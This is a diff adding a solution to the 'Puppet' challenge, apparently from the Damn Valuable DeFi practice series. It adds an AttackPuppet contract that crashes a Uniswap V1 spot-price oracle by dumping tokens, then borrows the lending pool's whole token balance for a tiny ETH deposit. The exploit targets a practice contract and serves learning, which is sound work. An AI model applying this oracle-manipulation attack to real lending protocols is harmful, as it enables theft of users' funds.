@@ -92,6 +92,28 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
+        console.log("### test_puppet start ###");
+
+        console.log("");
+        console.log("#1 Before attack");
+        console.log("Token balance of player:", token.balanceOf(player)/1e18);
+        console.log("Token balance of pool:", token.balanceOf(address(lendingPool))/1e18);
+
+        console.log("");
+        console.log("#2 Run attack");
+        AttackPuppet attackContract = new AttackPuppet(lendingPool, uniswapV1Exchange, token, player, recovery);
+
+        (bool _success, ) = address(attackContract).call{value: PLAYER_INITIAL_ETH_BALANCE}("");
+        assertTrue(_success, "Failed to send ETH to attack contract");
+        token.transfer(address(attackContract), PLAYER_INITIAL_TOKEN_BALANCE);
+        attackContract.attack();
+
+        console.log("");
+        console.log("#3 After attack");
+        console.log("Token balance of player:", token.balanceOf(player)/1e18);
+        console.log("Token balancev of pool:", token.balanceOf(address(lendingPool))/1e18);
+
+        console.log("### test_puppet end ###");
         
     }
 
@@ -115,4 +137,65 @@ contract PuppetChallenge is Test {
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+contract AttackPuppet {
+    uint256 playerInitialEthBalance;
+    uint256 playerInitialTokenBalance;
+    uint256 poolInitialTokenBalance;
+
+    PuppetPool pool;
+    IUniswapV1Exchange exchange;
+    DamnValuableToken token;
+    address player;
+    address recovery;
+
+    constructor(PuppetPool _pool, IUniswapV1Exchange _exchange, DamnValuableToken _token, address _player, address _recovery) payable{
+        pool = _pool;
+        exchange = _exchange;
+        token = _token;
+        player = _player;
+        recovery = _recovery;
+
+        playerInitialEthBalance = _player.balance;
+        playerInitialTokenBalance = _token.balanceOf(_player);
+        poolInitialTokenBalance = _token.balanceOf(address(_pool));
+    }
+
+    function attack() public {
+        console.log("");
+        console.log("## Before swap tokens to eth");
+        console.log("Balance of this    :", (address(this).balance)/1e18, "eth");
+        console.log("Balance of pool    :", (address(pool).balance)/1e18, "eth");
+        console.log("Balance of exchange:", (address(exchange).balance)/1e18, "eth");
+        console.log("Deposit required to borrow all tokens in pool:",
+            pool.calculateDepositRequired(poolInitialTokenBalance)/1e18, "eth");
+        token.approve(address(exchange), playerInitialTokenBalance);
+        // Swap all player's tokens to ETH, to drastically reduce the price of the token
+        exchange.tokenToEthSwapInput(
+            playerInitialTokenBalance,    // sell all player's tokens
+            1,                            // min. eth
+            block.timestamp + 1000        // deadline
+        );
+
+        console.log("");
+        console.log("## After swap tokens to eth");
+        console.log("Balance of this    :", (address(this).balance)/1e18, "eth");
+        console.log("Balance of pool    :", (address(pool).balance)/1e18, "eth");
+        console.log("Balance of exchange:", (address(exchange).balance)/1e18, "eth");
+        console.log("Deposit required to borrow all tokens in pool:",
+            pool.calculateDepositRequired(poolInitialTokenBalance)/1e18, "eth");
+
+        console.log("");
+        console.log("## Borrow all tokens in pool");
+        // Calculate deposit required to borrow all tokens in the pool
+        uint256 depositRequired = pool.calculateDepositRequired(poolInitialTokenBalance);
+        // Borrow all tokens in the pool, sending them to the recovery address
+        pool.borrow{value: depositRequired}(poolInitialTokenBalance, recovery);
+        console.log("Balance of this    :", (address(this).balance)/1e18, "eth");
+        console.log("Balance of pool    :", (address(pool).balance)/1e18, "eth");
+        console.log("Balance of exchange:", (address(exchange).balance)/1e18, "eth");
+    }
+
+    receive() external payable {}
 }
